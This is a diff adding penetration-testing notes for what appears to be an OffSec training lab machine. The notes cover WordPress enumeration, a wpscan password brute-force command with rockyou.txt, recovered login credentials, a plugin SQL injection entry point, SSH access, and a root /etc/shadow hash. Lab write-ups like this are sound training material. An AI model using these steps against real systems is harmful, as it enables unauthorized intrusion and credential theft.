@@ -1,0 +1,47 @@
+# home page info
+s3@n
+var _0xfc44=["\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x22\x77\x70\x2F\x6C\x6F\x67\x6F\x2E\x6A\x70\x67\x22","\x77\x72\x69\x74\x65"];document[_0xfc44[1]](_0xfc44[0]);
+=> var _64580=["<img src="wp/logo.jpg","write"];document[_0xfc44[1]](_64580[0]);
+
+# wordpress directories enumeration wordlist
+/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
+/usr/share/wordlists/SecLists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt
+
+# 1 found directories (WordPress)
+/wp/index.php	(index page)
+/wp/wp-includes (files include source code)            
+/wp/wp-content 	(blank page)
+/wp/wp-admin 	(wp-login.php page)
+/wp/xmlrpc.php 	(XML-RPC server accepts POST requests only)
+
+# 2 perform scan
+wpscan --url http://$IP/wp --enumerate ap --passwords /usr/share/wordlists/rockyou.txt -o wpscan.txt
+
+# 3 found user name and password (login)
+name: sean
+acc: admin 
+pwd: monkey
+email: sean@pwk.offsec.local
+
+# 4 found possible exploit
+WordPress Plugin AutoSuggest 0.24 - 'wpas_keys' SQL Injection  | php/webapps/45977.txt
+
+# SQLi 
+http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=0
+wpas_keys=<SQLi>
+SELECT * FROM $wpdb->posts WHERE (post_title LIKE '%$wpas_keys%') AND post_status = 'publish' ORDER BY post_date DESC
+
+# 5 login ssh with sean's credential
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" sean@$IP
+
+# 6 found another network
+10.1.1.246
+
+# 7 get the flag with sudo and password
+
+# /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+
+# /etc/shadow
+root:$6$BYnwgsXN$kYlnSPMxm8k.rNtTDqwWSyKdEWgViUflefxqhw4iXpQOngC5QnsBhNwgARJnqyOcqd9MyHE5gZMEgWCWT7niP/:18184:0:99999:7:::
+
